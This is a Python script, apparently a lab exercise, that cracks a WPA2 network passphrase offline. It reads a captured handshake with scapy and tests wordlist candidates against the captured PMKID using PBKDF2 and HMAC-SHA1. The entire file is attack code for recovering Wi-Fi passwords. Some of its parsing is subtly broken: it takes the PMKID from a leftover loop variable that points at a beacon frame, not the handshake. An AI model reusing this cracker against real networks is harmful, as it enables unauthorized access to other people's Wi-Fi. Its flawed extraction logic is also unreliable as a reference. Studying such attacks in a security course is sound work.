import sys

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
import hmac, hashlib

# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa        = rdpcap("PMKID_handshake.pcap")
filename   = "wordlist.txt"
ssid       = None
ap_mac     = None
client_mac = None
pmkid      = None
data       = None
handshake  = None

# Important parameters for key derivation - some of them can be obtained from the pcap file
A          = "PMK Name"  # this string is used in the pseudo-random function and should never be modified


# Going through the capture and getting the right handshake
for packet in wpa:
    try:
        if "EAPOL" in packet:
            handshake = packet
            for packet_bssid in wpa:
                try:
                    if packet_bssid.type == 0 and packet_bssid.subtype==8 and packet_bssid.addr2 == packet.addr2:
                        ssid = packet_bssid.info
                except:
                    pass
    except:
        pass

print(packet.addr2)
ap_mac = a2b_hex(str.replace(packet.addr2, ":", ""))
print(ap_mac)
client_mac = a2b_hex(str.replace(packet.addr1, ":", ""))
pmkid = hexlify(packet_bssid.load[-32:])
data = bytes(A, "utf8") + ap_mac + client_mac


found = False

with open(filename) as dictionary:
    for passPhrase in dictionary:
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase[:-1])

        print(passPhrase)

        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

        pmkid_calc = hmac.new(pmk, data, hashlib.sha1)

        test = pmkid_calc.hexdigest()[:-8]

        if pmkid == str.encode(test):
            print("Passphrase is : " + passPhrase.decode())
            found = True


    if not found:
        print("No passphrase found")


